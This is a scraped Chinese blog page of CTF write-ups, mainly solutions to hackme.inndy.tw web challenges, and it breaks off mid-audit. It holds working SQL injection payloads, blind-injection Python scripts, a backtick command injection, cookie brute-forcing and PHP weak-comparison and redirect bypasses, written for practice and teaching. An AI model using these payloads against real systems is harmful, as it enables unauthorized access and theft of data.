class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>将反序列化数据上传上去</p>
<p>最终拿到shell。</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/10/27/BalsnCTF2019-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0/" data-id="ckabsu37s000ckkvr5x8v1n7l" class="article-share-link" data-share="baidu" data-title="BalsnCTF2019+巅峰极客复现">Share</a>
      

      
        <a href="http://yoursite.com/2019/10/27/BalsnCTF2019-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Hackme-web" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/27/Hackme-web/" class="article-date">
  <time datetime="2019-10-27T08:41:49.000Z" itemprop="datePublished">2019-10-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/27/Hackme-web/">Hackme-web</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="Guestbook"><a href="#Guestbook" class="headerlink" title="Guestbook"></a>Guestbook</h3><p>注入点挺多</p>
<p>insert标题处存在注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and sleep(3) and &#39;</span><br></pre></td></tr></table></figure>

<p>即可验证成功</p>
<p>id地方也可以注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1 union select 1,2,3,(select group_concat(flag) from flag) --</span><br></pre></td></tr></table></figure>

<p>思考了一下如何最快的通过注入拿到数据的方法，时间盲注那肯定是最慢的，还受网络影响…,不到最后还是别时间盲注了吧</p>
<h3 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h3><p>没过滤掉危险的反引号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;nl f*&#96;&#x2F;&#x2F;通过sort也可以</span><br></pre></td></tr></table></figure>

<h3 id="Scoreboard"><a href="#Scoreboard" class="headerlink" title="Scoreboard"></a>Scoreboard</h3><p>严重吐槽scoreboard和homepage两个题…..累不累啊..</p>
<h3 id="login-as-admin-0"><a href="#login-as-admin-0" class="headerlink" title="login as admin 0"></a>login as admin 0</h3><p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">'or 1=1'</span>) || strstr($strl, <span class="string">'drop'</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'update'</span>) || strstr($strl, <span class="string">'delete'</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_POST = array_map(safe_filter, $_POST);</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// connect to database</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'name'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $connection_string = sprintf(<span class="string">'mysql:host=%s;dbname=%s;charset=utf8mb4'</span>, DB_HOST, DB_NAME);</span><br><span class="line">    $db = <span class="keyword">new</span> PDO($connection_string, DB_USER, DB_PASS);</span><br><span class="line">    $sql = sprintf(<span class="string">"SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'"</span>,</span><br><span class="line">        $_POST[<span class="string">'name'</span>],</span><br><span class="line">        $_POST[<span class="string">'password'</span>]</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $query = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>($query) &#123;</span><br><span class="line">            $user = $query-&gt;fetchObject();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $user = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        $user = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>算是个脑筋急转弯吧，开始通过payload进去了，发现是guest，那可能admin在id为2的那条</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:admin\&#39; or is_admin&#x3D;1#</span><br><span class="line"> &#x2F;&#x2F; admin\&#39; or id&#x3D;2#</span><br></pre></td></tr></table></figure>

<h3 id="login-as-admin-0-1"><a href="#login-as-admin-0-1" class="headerlink" title="login as admin 0.1"></a>login as admin 0.1</h3><p>可以堆叠加盲注</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">url=<span class="string">"https://hackme.inndy.tw/login0/"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">		data=&#123;</span><br><span class="line">	<span class="string">'name'</span>:<span class="string">"admin\';select if(&#123;&#125;=ascii(mid((version()),&#123;&#125;,1)),sleep(3),1);"</span>.format(j,i),</span><br><span class="line">	<span class="string">'password'</span>:<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			r=requests.post(url,data=data,timeout=<span class="number">2.8</span>)</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			flag+=chr(j)</span><br><span class="line">			<span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<p>然而更好做法是union…</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin\&#39; union select 1,(select the_f14g from h1dden_f14g limit 0,1),3,4#</span><br></pre></td></tr></table></figure>

<p>以后做题还是先试试union或者报错注入，毕竟时间盲注是最低效的操作。</p>
<h3 id="login-as-admin-1"><a href="#login-as-admin-1" class="headerlink" title="login as admin 1"></a>login as admin 1</h3><p>变了一下过滤，没什么太大用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">' '</span>) || strstr($strl, <span class="string">'1=1'</span>) || strstr($strl, <span class="string">"''"</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'union select'</span>) || strstr($strl, <span class="string">'select '</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没啥区别…</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin\&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;id&#x3D;2#</span><br></pre></td></tr></table></figure>

<h3 id="login-as-admin-1-2"><a href="#login-as-admin-1-2" class="headerlink" title="login as admin 1.2"></a>login as admin 1.2</h3><p>这个问题，上次盲注脚本就能解决，空格换一下就行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line">url&#x3D;&quot;https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;login0&#x2F;&quot;</span><br><span class="line">for i in range(1,32):</span><br><span class="line">	for j in range(33,127):</span><br><span class="line">		data&#x3D;&#123;</span><br><span class="line">	&#39;name&#39;:&quot;admin\&#39;;select&#x2F;**&#x2F;if(&#123;&#125;&#x3D;ascii(mid((version()),&#123;&#125;,1)),sleep(3),1);&quot;.format(j,i),</span><br><span class="line">	&#39;password&#39;:1</span><br><span class="line">&#125;</span><br><span class="line">		try:</span><br><span class="line">			r&#x3D;requests.post(url,data&#x3D;data,timeout&#x3D;2.8)</span><br><span class="line">		except:</span><br><span class="line">			flag+&#x3D;chr(j)</span><br><span class="line">			print flag</span><br></pre></td></tr></table></figure>

<h3 id="Login-as-Admin-3"><a href="#Login-as-Admin-3" class="headerlink" title="Login as Admin 3"></a>Login as Admin 3</h3><p>最开始有点想偏了…还想从json中注入新的admin字段…真是天真，后来发现hmac有弱类型比较，爆破一下cookie中的值就行了，发现9的时候正好可以。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">"https://hackme.inndy.tw/login3/"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">	data=<span class="string">'&#123;"sig":0,"data":"[\\"guest\\",'</span>+chr(i)+<span class="string">']"&#125;'</span></span><br><span class="line">	<span class="keyword">print</span> data</span><br><span class="line">	payload=base64.b64encode(data)</span><br><span class="line">	cookies=&#123;</span><br><span class="line">	<span class="string">'user'</span>:payload</span><br><span class="line">	&#125;</span><br><span class="line">	r=requests.get(url,cookies=cookies)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"You are admin"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">		<span class="keyword">print</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="comment">###</span></span><br></pre></td></tr></table></figure>

<h3 id="Login-as-Admin4"><a href="#Login-as-Admin4" class="headerlink" title="Login as Admin4"></a>Login as Admin4</h3><p>应该算个逻辑漏洞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'name'</span>] === <span class="string">'admin'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'password'</span>] !== $password) &#123;</span><br><span class="line">        <span class="comment">// show failed message if you input wrong password</span></span><br><span class="line">        header(<span class="string">'Location: ./?failed=1'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们知道在location后如果不加exit()那么会执行header下面的代码</p>
<p>我们在用curl的时候不加-L是不会跟随跳转的，所以如果接着执行下面的代码的话，直接会bypass验证，拿到flag，所以header后一定要加个exit()啊</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;login4&#x2F; -d &quot;name&#x3D;admin&quot;</span><br></pre></td></tr></table></figure>

<h3 id="Login-as-Admin6"><a href="#Login-as-Admin6" class="headerlink" title="Login as Admin6"></a>Login as Admin6</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(E_ALL^E_NOTICE);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'show_source'</span>] === <span class="string">'1'</span>) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// connect to database</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'data'</span>])) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $data = json_decode($_POST[<span class="string">'data'</span>], <span class="keyword">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        $data = [];</span><br><span class="line">    &#125;</span><br><span class="line">    extract($data);</span><br><span class="line">    <span class="keyword">if</span>($users[$username] &amp;&amp; strcmp($users[$username], $password) == <span class="number">0</span>) &#123;</span><br><span class="line">        $user = $username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Payload如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//&#123;"username":"admin","users":&#123;"admin":"lihuaiqiu"&#125;,"password":"lihuaiqiu"&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$payload[<span class="string">'username'</span>]=<span class="string">'admin'</span>;</span><br><span class="line"></span><br><span class="line">$payload[<span class="string">'users'</span>][<span class="string">'admin'</span>]=<span class="string">'lihuaiqiu'</span>;</span><br><span class="line"></span><br><span class="line">$payload[<span class="string">'password'</span>]=<span class="string">'lihuaiqiu'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> json_encode($payload);</span><br></pre></td></tr></table></figure>

<h3 id="Login-as-Admin7"><a href="#Login-as-Admin7" class="headerlink" title="Login as Admin7"></a>Login as Admin7</h3><p>弱类型</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=QNKCDZO</span><br></pre></td></tr></table></figure>

<h3 id="dafuq-manager-1"><a href="#dafuq-manager-1" class="headerlink" title="dafuq-manager 1"></a>dafuq-manager 1</h3><p>这个系列的靶场我觉得挺有意思的，有种小小型cms的感觉吧，也学到了一些有趣的知识</p>
<p>第一关需要登陆guest找到flag</p>
<p>我们可以看到cookie里有一些有趣的东西，将cookie中的show_hidden改为yes拿到flag</p>
<h3 id="dafuq-manager-2"><a href="#dafuq-manager-2" class="headerlink" title="dafuq-manager 2"></a>dafuq-manager 2</h3><p>题目要求以admin登陆才可以拿到flag,并且给了源码，把源码下载下来开始审计</p>
<p>可以看到入口是一个switch（话说这代码写的看的人是真的难受…</p>
<p><strong>index.php中跟进case “admin”</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">"admin"</span>:</span><br><span class="line">    <span class="keyword">require</span> <span class="string">"./core/fun_admin.php"</span>;</span><br><span class="line">    show_admin($GLOBALS[<span class="string">"dir"</span>]);</span><br></pre></td></tr></table></figure>

<p><strong>fun_admin.php中跟进show_admin</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_admin</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">    $pwd = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">2</span>) == <span class="number">2</span>);</span><br><span class="line">    $admin = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">4</span>) == <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> (!$GLOBALS[<span class="string">"require_login"</span>]) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"miscnofunc"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($GLOBALS[<span class="string">'__GET'</span>][<span class="string">"action2"</span>])) $action2 = $GLOBALS[<span class="string">'__GET'</span>][<span class="string">"action2"</span>];</span><br><span class="line">    <span class="keyword">elseif</span> (<span class="keyword">isset</span>($GLOBALS[<span class="string">'__POST'</span>][<span class="string">"action2"</span>])) $action2 = $GLOBALS[<span class="string">'__POST'</span>][<span class="string">"action2"</span>];</span><br><span class="line">    <span class="keyword">else</span> $action2 = <span class="string">""</span>;</span><br><span class="line"><span class="comment">// admin所拥有的功能</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当$GLOBALS[“permissions”]大于4，即可满足所有admin功能</p>
<p>可以看一下当前用户的permissons</p>
<p><strong>跟进fun_users.php中activate_user</strong></p>
<p>发现</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">activate_user</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">    $data = find_user($user, $pass);</span><br><span class="line">    <span class="keyword">if</span> ($data == <span class="keyword">NULL</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    ...</span><br><span class="line">    $GLOBALS[<span class="string">"permissions"</span>] = $data[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>跟进find_user</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> &amp;<span class="title">find_user</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">    $cnt = count($GLOBALS[<span class="string">"users"</span>]);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; $cnt;++$i) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($user == $GLOBALS[<span class="string">"users"</span>][$i][<span class="number">0</span>]) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($pass == <span class="keyword">NULL</span> || ($pass == $GLOBALS[<span class="string">"users"</span>][$i][<span class="number">1</span>] &amp;&amp; $GLOBALS[<span class="string">"users"</span>][$i][<span class="number">7</span>])) &#123;</span><br><span class="line">                <span class="keyword">return</span> $GLOBALS[<span class="string">"users"</span>][$i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>跟进$GLOBALS[“users”]</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$GLOBALS[<span class="string">"users"</span>] = <span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">"guest"</span>, <span class="string">"084e0343a0486ff05530df6c705c8bb4"</span>, <span class="string">"./data/guest"</span>, <span class="string">"https://game1.security.ntu.st/data/guest"</span>, <span class="number">0</span>, <span class="string">"^.ht"</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>其实我们最终得到的也就是这个数组，$data[6]=1,所以不满足admin功能的权限要求，可以思考一下，如果想要我们以admin登陆，会有哪几种方法呢，刚才跟进的时候会发现htusers.php是储存着用户信息的，第一种方法我们可以去读取题中的htuseres，第二种就是sql注入，第三种就是hash长度扩展攻击</p>
<p>思考一下这几种方法的可行性</p>
<ul>
<li>文件读取的话，本题恰好有下载功能，当然其他函数也可以读源码，比如file_get_contents,readfile,fopen之类的</li>
<li>sql注入…我连个select语句都没看到，应该不可能</li>
<li>hash长度扩展攻击，没有关键的代码出现，也不可能</li>
</ul>
<p>所以最终攻击点还是落在文件读取，我们可以去读题种的htusers.php来得到用户的信息，首先去看一下download功能，因为一般拿到源码都是通过download</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> (<span class="string">'core/secure.php'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download_item</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    $item = basename($item);</span><br><span class="line">    <span class="keyword">if</span> (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">01</span>) != <span class="number">01</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_is_file($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_show_item($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">    $abs_item = get_abs_item($dir, $item);</span><br><span class="line">    <span class="keyword">if</span> (!file_in_web($abs_item) || stristr($abs_item, <span class="string">'.php'</span>) || stristr($abs_item, <span class="string">'config'</span>)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">...</span><br><span class="line">    @readfile($abs_item);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先跟进约束条件进行一些尝试</p>
<p>$GLOBALS[“permissions”] &amp; 01，我们身为guest还是很满足这个条件的</p>
<p>get_is_file函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_is_file</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> @is_file(get_abs_item($dir, $item));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>跟进get_abs_item</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_abs_item</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> get_abs_dir($dir) . <span class="string">"/"</span> . $item;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_abs_dir</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">    $abs_dir = $GLOBALS[<span class="string">"home_dir"</span>]; <span class="comment">//home_dir="data/guest"</span></span><br><span class="line">    <span class="keyword">if</span> ($dir != <span class="string">""</span>) $abs_dir.= <span class="string">"/"</span> . $dir;</span><br><span class="line">    <span class="keyword">return</span> $abs_dir;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在$dir为空的情况下其实就是用is_file对data/guest/$item进行判断，那么这个条件也肯定是满足的</p>
<p><strong>跟进get_show_item</strong></p>
<p>发现劝退代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$abs_item = get_abs_item($dir, $item);<span class="comment">//     /$item</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!file_in_web($abs_item) || stristr($abs_item, <span class="string">'.php'</span>) || stristr($abs_item, <span class="string">'config'</span>)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">$browser = id_browser();</span><br></pre></td></tr></table></figure>

<p>如果发现.php或者config直接不解释返回false，正好我们需要这两个字符串，所以download这个地方是不行了，接着换个思路，全局搜索一下readfile,file_get_contents，fopen这样的函数</p>
<p><strong>最后在fun_edit.php中的edit_file中发现fopen，重新回到入口，发现action为edit也正好对应edit_file这个函数，跟进edit_file</strong></p>
<p>前三个条件都是正常符合的，在get_show_item中其实他是存在过滤的，只不过可能过滤的不太对，比如下面这段代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_show_item</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($item == <span class="string">"."</span> || $item == <span class="string">".."</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br></pre></td></tr></table></figure>

<p>基本相当于没作用吧，接着回去</p>
<p>在$dir置空的情况下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$fname = get_abs_item($dir, $item);</span><br></pre></td></tr></table></figure>

<p>$fname=data/guest.$item</p>
<p>接下来调用file_in_web函数判断fname</p>
